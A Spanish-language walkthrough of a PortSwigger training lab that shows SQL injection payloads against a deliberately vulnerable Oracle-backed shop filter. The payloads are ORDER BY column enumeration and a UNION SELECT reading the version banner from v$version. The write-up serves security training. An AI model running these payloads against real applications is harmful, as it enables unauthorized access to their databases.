# PortSwigger - SQL i


## Lab: SQL injection attack, querying the database type and version on Oracle


## Solución

Primero hacemos click en **Accessories** o en cualquier otro filtro de búsqueda.

![](./imagenes/lab7-1.png)

Luego ejecutamos una query para enumerar la cantidad de columnas que existen.

```sql
' ORDER BY 1 -- -
```

![](./imagenes/lab7-4.png)

Con 1 la página funciona correctamente. Debemos seguir hasta que la página falle.

```sql
' ORDER BY 1,2 -- -
```

![](./imagenes/lab7-5.png)

Con 3 la página falla, esto significa que debemos agregar 2 `null` a nuestra query final.

```sql
' ORDER BY 1,2,3 -- -
```

![](./imagenes/lab7-6.png)

Siguiendo la [cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet) de PortSwigger podemos armar nuestra query final. 

Debemos identificar la versión que la base de datos, primero probaremos con Oracle y si no funciona probamos con Microsoft, PostgreSQL y así.

```sql
' UNION SELECT banner,null from v$version -- -
```

Por suerte el primer payload funcionó e identificamos que la base de datos es Oracle, además resolvimos el lab.

![](./imagenes/lab7-7.png)

